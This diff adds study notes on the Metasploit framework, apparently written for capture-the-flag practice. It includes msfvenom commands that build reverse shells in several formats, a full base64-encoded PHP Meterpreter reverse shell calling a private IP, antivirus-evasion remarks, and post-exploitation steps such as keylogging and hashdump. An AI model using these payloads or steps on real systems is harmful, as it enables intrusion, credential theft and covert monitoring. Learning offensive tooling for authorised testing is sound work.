@@ -1,0 +1,313 @@
+= Automation
+
+== Metasploit
+Tool useful from information gathering to post-exploitation.
+
+Two main versions:
+
+* Metasploit pro: commercial version with GUI
+* Metasploit framework: OS version from the command line
+
+The framework is a set of tools that allows information gathering, scanning, exploitation, exploit development, post-exploitation, ... It is useful for penetration tests, vulnerability research and exploit development.
+
+=== Concepts
+
+* exploit: piece of code that uses a vulnerability present on the target system
+* vulnerability: design/coding/logic flaw affecting the target system
+* payload: code that will run on the target system after an exploit has taken advantage of a vulnerability
+
+=== Components
+
+* msfconsole: main command line interface
+* modules: supporting modules such as exploits, scanners, payloads, etc
+* tools: stand-alone tools to help vulnerability research, vulnerability assessment, pen test => msfvenom, pattern_create, pattern_offset
+
+==== Modules
+Found in modules directory of metasploit:
+
+* Auxiliary: any supporting module such as scanners, crawlers, fuzzers, ...
+* Encoders: encode the exploit and payload in the hope that a signature-based antivirus solution may miss them
+* Evasion: encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software
+* Exploits: organized by target systems
+* NOPs (No Operation): do nothing, used as a buffer to achieve consistent payload sizes (related to CPU)
+* Payloads: codes that will run on the target system
+** singles: self-contained payloads that do not need an additional component to run
+** stagers: set a connection between metasploit and the target system. Staged payloads will first upload a stager on the target system then download the rest of the payload (stage)
+** stages: downloaded by the stager -> use large sized payloads
+* Post: final stage of pen testing process (post-exploitation)
+
+==== Msfconsole
+Acts like a basic shell for basic commands (ls, ping, history, ...). The command "help" can be followed by other msf commands such as "set" to get help on these commands.
+
+Msfconsole is managed by context; this means that unless set as a global variable, all parameter settings will be lost if we change the module to use.
+
+Modules have https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html[ranks] from ExcellentRanking to LowRanking/ManualRanking that tell how reliable some module is.
+
+==== Msfvenom
+Replaces msfpayload and msfencode; is used to generate payloads in many different formats (PHP, exe, dll, elf, ...) and for many different target systems (Apple, Windows, Android, Linux, ...).
+
+We can generate stand-alone payloads (windows executable for meterpreter) or get a usable raw format (python, ...).
+
+[source, bash]
+----
+msfvenom --list formats
+msfvenom -p <PAYLOAD> <OPTIONS>
+----
+
+Example to generate a windows x64 reverse shell in exe format:
+[source, bash]
+----
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+----
+
+* -f: output format
+* -o: output location and file name
+* LHOST=<ip>: ip to connect back
+* LPORT=<port>: port to connect back
+
+We can create staged (stager + stage) and stageless payloads (one single payload).
+
+===== Payload Naming convention
+<OS>/arch/payload like linux/x86/shell_reverse_tcp
+
+If we see shell_xxx or meterpreter_xxx that's a stageless payload. For staged, we see windows/x86/meterpreter/reverse_tcp (the slash between meterpreter and the payload)
+
+[source, bash]
+----
+msfvenom --list payloads | grep xxx
+----
+
+===== Encoders
+Shouldn't be used to bypass antivirus because it is better to use modern obfuscation techniques or learn methods to inject shellcode.
+
+[source, bash]
+----
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.74.41 -f raw -e php/base64
+
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of php/base64
+php/base64 succeeded with size 1506 (iteration=0)
+php/base64 chosen with final size 1506
+Payload size: 1506 bytes
+eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjExLjc0LjQxJzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJO.bGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs));
+
+----
+
+===== Handlers
+Used to accept incoming connections generated by the msfvenom payload. When using a module, this part is automatically handled by the exploit.
+
+Use exploit/multi/handler command which supports all metasploit payloads and can be used for meterpreter and regular shells. We need to set LHOST and LPORT options. Multi/Handler is a superb tool for catching reverse shells. It's essential if we want to use Meterpreter shells, and is the go-to when using staged payloads.
+
+Use `exploit -j` with exploit/multi/handler to start a listener in the background.
+
+===== Other payloads
+Linux executable and linkable format (elf) (need to chmod +x on target machine and execute it)
+
+[source, bash]
+----
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+----
+
+Windows
+[source, bash]
+----
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+----
+
+PHP
+[source, bash]
+----
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+----
+
+ASP
+[source, bash]
+----
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+----
+
+Python
+[source, bash]
+----
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+----
+
+All these payloads are reverse payloads so we need exploit/multi/handler module listening on our attack machine.
+
+==== Meterpreter
+Meterpreter agent was loaded to the target system and connected back to us where we can use Meterpreter specific commands.
+
+Meterpreter has many versions which will provide different functionalities based on the target system.
+
+Convert shell to meterpreter: post/multi/manage/shell_to_meterpreter
+
+===== Stealth
+A little bit stealthy because it only runs in RAM, no executable save on target's disk to prevent antivirus to scan it.
+
+It also aims to avoid being detected by network-based intrusion prevention system (IPS) and intrusion detection system (IDS) by using encrypted communication with the server where Metasploit runs.
+
+Meterpreter hides itself in process list by taking a name like spoolsv.exe and the DLL associated look normal
+
+[source, bash]
+----
+tasklist /m /fi "pid eq 1304"
+----
+
+Even with all that, most antivirus will detect it.
+
+===== Flavors
+Metasploit payloads can be divided into two categories; inline/single and staged (first stager then it downloads the stage).
+
+[source, bash]
+----
+msfvenom --list payloads | grep meterpreter
+----
+
+Find which version to use:
+
+* what is the target OS (Mac, Windows, ...)?
+* what is installed on the server (python, php, ...)?
+* what is the network connection types (TCP connections, HTTPS reverse connection, IPv6 not monitored like IPv4, ...)?
+
+===== Commands
+Type `help` on any Meterpreter session.
+
+Three primary categories of tools: built-in commands, meterpreter tools, meterpreter scripting.
+
+* Core commands (background, exit, guid, info, run, sessions, ...)
+* File system commands (cd, ls, search, download, upload, ...)
+* Networking commands (arp, ifconfig, portfwd, route, ...)
+* System commands (getpid, execute, kill, ps, reboot, shell, sysinfo, ...)
+* User interface commands
+* Webcam commands
+* Audio output commands
+* Elevate commands
+* Password database commands
+* Timestomp commands
+
+Other notable commands: hashdump (dumps SAM database), getsystem (get root), keylogging (keyscan_dump, start, stop), microphones, webcam, ...
+
+===== Post-exploitation
+`getuid` is useful to see if we are admin (NT AUTHORITY\SYSTEM) or not
+
+`ps` and `migrate` are used to interact with a process directly. If we see a word processor (word.exe, notepad.exe), we can migrate to the pid and then use the keylogging feature. We may lose our admin privilege, and we may not get them back!
+
+`hashdump` lists the content of the SAM (Security Account Manager) database of Windows systems; passwords are stored in NTLM format. We may need to migrate to lsass.exe process first then run hashdump.
+
+`search` finds a file on file system like "search -f flag2.txt"
+
+`shell` get a shell, can get back to meterpreter with CTRL+Z
+
+`load` load python or load kiwi (mimikatz) for instance. Check help after loading them.
+
+=== Commands
+
+|===
+|Command |Description
+
+|search
+|Search for a module, can specify type:auxiliary to only search there
+
+|use
+|Use number of the found module with search
+
+|options or show options
+|Print options
+
+|set
+|Set option with a given value
+
+|setg
+|Set general option (like RHOSTS) between all modules
+
+|run or exploit
+|Run the exploit
+
+|check
+|Some module support the check option to verify that a target is vulnerable without exploiting it
+
+|background or CTRL+Z
+|Background a session prompt (meterpreter) and go back to msfconsole prompt
+
+|sessions
+|See existing sessions. Use sessions -i session_number to enter it
+
+|back
+|Leave the context of a module
+
+|info
+|Get information on any module
+
+|unset or unset all
+|Reset an option or all of them
+
+|unsetg
+|Reset a general option
+
+|===
+
+=== Notable Features
+
+==== Port Scanning
+search portscan for available modules; we can also use nmap from the msfconsole
+
+For quick UDP service identification: scanner/discovery/udp_sweep (quick find of DNS or NetBIOS)
+
+Also useful for SMB scans with smb_enumshares and smb_version.
+
+We shouldn't neglect NetBios which allows computers to communicate over the network to share files or send files to printers. The NetBIOS name can give us an idea about its role or importance (SALES, DEVOPS, ...). We may encounter some shared files and folders with basic login.
+
+==== Metasploit Database
+Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values -> not really needed for ctf, only real pen test.
+
+Install ruby, postgresql, start the database and initialize it.
+
+[source, bash]
+----
+$ sudo pacman -S postgresql ruby
+$ curl -L get.rvm.io > /tmp/rvm-install && chmod u+x /tmp/rvm-install
+$ bash < ./tmp/rvm-install
+$ source ~/.rvm/scripts/rvm
+$ gem install bundler
+$ msfdb init --connection-string=postgresql://postgres@localhost:5432/postgres
+----
+
+===== Commands
+|===
+|Command |Description
+
+|db_status
+|Check database status (connection, ...)
+
+|workspace
+|-a xxx (create), -d xxx (delete), -h
+
+|db_nmap
+|Execute nmap and records the output automatically
+
+|hosts
+|List all hosts in the database. First run db_nmap
+
+|loot
+|List all loot in the database
+
+|notes
+|List all notes in the database
+
+|services
+|List all services in the database. First run db_nmap
+
+|vulns
+|list all vulnerabilities in the database
+
+|===
+
+==== Vulnerability Scanning
+First recon what services are running then use Metasploit scanners on specific services.
+
+==== Exploitation
+For most exploits, there is a default payload but we can use "show payloads" to see what's available then "set payload".
+
+It is needed to try several payload due to environmental or OS restrictions (firewall rules, anti-virus, file writing, ...) or even if the payload execution is not available (python, ...).
